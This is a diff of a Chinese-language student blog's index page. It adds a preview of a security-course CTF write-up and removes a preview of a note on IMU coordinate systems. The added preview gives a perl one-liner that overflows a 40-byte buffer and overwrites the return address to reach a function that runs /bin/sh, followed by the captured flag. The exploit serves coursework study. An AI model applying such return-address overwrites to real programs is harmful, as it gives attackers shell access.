@@ -68,7 +68,7 @@
 						<li>Tags</li>
 						
 						
-						<li>About</li>
+						<li>Über</li>
 						
 					</ul>
 				</div>
@@ -103,7 +103,7 @@
 				
 				<section class="switch-part switch-part2">
 					<div class="widget tagcloud" id="js-tagcloud">
-						<a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/Linux/" style="font-size: 12.5px;">Linux</a> <a href="/tags/NCU/" style="font-size: 17.5px;">NCU</a> <a href="/tags/筆記/" style="font-size: 20px;">筆記</a> <a href="/tags/開箱/" style="font-size: 10px;">開箱</a> <a href="/tags/開箱文/" style="font-size: 10px;">開箱文</a>
+						<a href="/tags/CTF/" style="font-size: 16.67px;">CTF</a> <a href="/tags/Linux/" style="font-size: 13.33px;">Linux</a> <a href="/tags/NCU/" style="font-size: 16.67px;">NCU</a> <a href="/tags/NTU/" style="font-size: 10px;">NTU</a> <a href="/tags/筆記/" style="font-size: 20px;">筆記</a> <a href="/tags/開箱/" style="font-size: 10px;">開箱</a> <a href="/tags/開箱文/" style="font-size: 10px;">開箱文</a>
 					</div>
 				</section>
 				
@@ -166,6 +166,69 @@
 </nav>
 
       <div class="body-wrap">
+  
+    <article id="post-EDU-CTF-計算機安全" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2017/10/15/EDU-CTF-計算機安全/" class="article-date">
+  	<time datetime="2017-10-15T02:34:27.000Z" itemprop="datePublished">2017-10-15</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/10/15/EDU-CTF-計算機安全/">EDU-CTF 計算機安全</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="u524D_u8A00"><a href="#u524D_u8A00" class="headerlink" title="前言"></a>前言</h2><p>這堂課是台大、台科大、交大、中央(?聯合的資安課程<br>今年全上pwn跟reverse，跟前年不太一樣(前年還有教Web、Crypto…等)<br>這一篇文章主要放這門課作業和練習的Write up，記錄一下解法怕忘記</p>
+<h2 id="5Bhw0_5D_Pwn_1"><a href="#5Bhw0_5D_Pwn_1" class="headerlink" title="[hw0] Pwn 1"></a>[hw0] Pwn 1</h2><p>0x400566有個<code>callme()</code><br>裡頭就是<code>system(&quot;/bin/sh&quot;)</code><br>overflow蓋return address跳過去即可get shell<br>padding長度40</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e &apos;print &quot;A&quot;x40, &quot;\x66\x05\x40\x00\x00\x00\x00\x00&quot;&apos;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG&#123;BuFFer_0V3Rflow_is_too_easy&#125;</div></pre></td></tr></table></figure>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/NTU/">NTU</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/筆記/">筆記</a></li></ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a  href="/2017/10/15/EDU-CTF-計算機安全/#more">more >></a>
+        </p>
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
   
     <article id="post-AIS3-2017-Workshop" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -452,67 +515,6 @@
       
         <p class="article-more-link">
           <a  href="/2017/07/16/AIS3-pre-exam-writeup/#more">more >></a>
-        </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-座標系、歐拉角與方位角" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2017/07/04/座標系、歐拉角與方位角/" class="article-date">
-  	<time datetime="2017-07-03T16:50:11.000Z" itemprop="datePublished">2017-07-04</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/07/04/座標系、歐拉角與方位角/">座標系、歐拉角與方位角</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>此篇文章為我在研究利用車載IMU判斷行進方向並預防事故的一些技術資料整理及個人理解。<br>可能在學術上不是很嚴謹，也有可能有地方有錯誤。<br>名詞定義上也可能和其他學術論文不同。</p>
-<h2 id="u74B0_u5883"><a href="#u74B0_u5883" class="headerlink" title="環境"></a>環境</h2><p><strong><em> IMU(Inertial measurement unit): 慣性測量單元 </em></strong><br> IMU包含加速度計、磁力計、陀螺儀等sensor<br> 而IMU被包進後照鏡中，掛在車子上<br> 目的是希望車子行進時，可以計算出車子的方向或是其他資訊來幫助後續處理</p>
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/筆記/">筆記</a></li></ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a  href="/2017/07/04/座標系、歐拉角與方位角/#more">more >></a>
         </p>
       
       <div class="clearfix"></div>
